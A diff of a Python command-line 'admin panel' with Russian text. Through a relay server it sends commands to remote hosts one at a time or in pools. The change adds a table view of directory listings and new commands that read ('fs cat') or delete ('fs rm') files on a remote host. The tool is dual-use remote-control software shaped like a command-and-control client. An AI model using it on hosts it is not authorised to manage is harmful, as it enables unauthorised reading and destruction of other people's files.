@@ -1,4 +1,5 @@
 # TODO: Сделать так, чтобы можно было прописывать алиасы для host_id.
+import tabulate
 from termcolor import colored
 import getpass
 import socket
@@ -302,7 +303,7 @@ class ServerConnection:
     """ Класс подключения к серверу """
     MID_CONN_SERVER_HOST = "192.168.1.71"
     MID_CONN_SERVER_PORT = 9090
-    RECV_BUFF_SIZE = 2048
+    RECV_BUFF_SIZE = 16384
     TERMINATOR = b"\x04"
 
     def __init__(self):
@@ -358,18 +359,20 @@ def main():
             print(f"""[{colored('?', 'yellow')}] Список команд админской панели.
 Последнее обновление: 12.09.2022\n
 [[ РЕЖИМЫ ОТПРАВКИ ПАКЕТОВ ]] 
-* unicast (host_id) - Переключается на отправку команд хосту, указанному в поле host_id.
-* broadcast (pool_id) - Отправляет команды всем хостам в пуле, указанном в поле pool_id.
+* unicast (host_id) - Переключается на отправку команд хосту с ID (host_id).
+* broadcast (pool_id) - Отправляет команды всем хостам в пуле с номером (pool_id).
 
 [[ УПРАВЛЕНИЕ ПУЛОМ ]]
 * pool create - Создает новый пул. Чтобы узнать его номер, введите следующую команду.
 * pool members - Выводит список всех участников во всех админских пулах.
-* pool delete - Удаляет пул.
+* pool delete (pool_id) - Удаляет пул с номером (pool_id).
 
 [[ КОМАНДЫ УТИЛИТЫ "FS" ]]
 * fs pwd - Возвращает текущий путь хоста.
-* fs cd - Меняет текущий путь хоста.
+* fs cd (path) - Меняет текущий путь хоста на (path).
 * fs ls - Возвращает список всех файлов в текущем каталоге. 
+* fs rm (path) - Удаляет файл, находящийся по адресу (path).
+* fs cat (path) - Возвращает содержимое файла, находящегося по адресу (path).
 """)
         # -------------------------------------------------------------------------------------------------------
 
@@ -460,7 +463,8 @@ def main():
 
             if response.IS_SUCCESS:
                 # TODO: Сделать так, чтобы сервер возвращался в поле DATA код нового созданного пула.
-                print(f"[{colored('+', 'green')}] Был создан пул с номером {response.DATA}")
+                print(f"[{colored('+', 'green')}] Был создан пул. Введите \"pool members\" для "
+                      f"получения подробной информации о нем.")
             else:
                 print(f"[{colored('-', 'red')}] Ошибка создания пула.")
 
@@ -498,17 +502,29 @@ def main():
                     request_packet = UnicastPacket(command, SAVED_HOST_ID)
                     response = connection.send_packet(request_packet).DATA
 
+                    table_data = []
+
                     for file in response:
-                        if file["is_file"]:
-                            filename = file["filename"]
-                        else:
-                            filename = colored(file["filename"], "orange")
+                        table_data.append([file["filename"], file["size"]])
 
-                        print(filename)
-
+                    table = tabulate.tabulate(table_data, headers=["Имя файла", "Размер"])
+                    print(table)
                     print()
+
+                elif command.startswith("fs rm "):
+                    connection = ServerConnection()
+                    request_packet = UnicastPacket(command, SAVED_HOST_ID)
+                    response = connection.send_packet(request_packet).DATA
+                    print(f"[{colored('+', 'green')}] Файл успешно удален.\n")
+
+                elif command.startswith("fs cat "):
+                    print(f"[{colored('+', 'green')}] Вывод содержимого файла: \"{command[7::]}\"")
+                    connection = ServerConnection()
+                    request_packet = UnicastPacket(command, SAVED_HOST_ID)
+                    response = connection.send_packet(request_packet).DATA
+                    print(response)
                 else:
-                    print(f"[{colored('!', 'red')}] Неизвестная команда. Повторите попытку.")
+                    print(f"[{colored('!', 'red')}] Неизвестная команда. Повторите попытку.\n")
             else:
                 print(f"[{colored('!', 'red')}] Утилиту \"fs\" возможно использовать только в режиме Unicast.")
         # -------------------------------------------------------------------------------------------------------
@@ -516,7 +532,7 @@ def main():
         # В остальном случае, если команда не соответствует
         # никакой из реализаций утилит: локальная ошибка.
         else:
-            print(f"[{colored('!', 'red')}] Неизвестная команда. Повторите попытку.")
+            print(f"[{colored('!', 'red')}] Неизвестная команда. Повторите попытку.\n")
 
 
 if __name__ == "__main__":
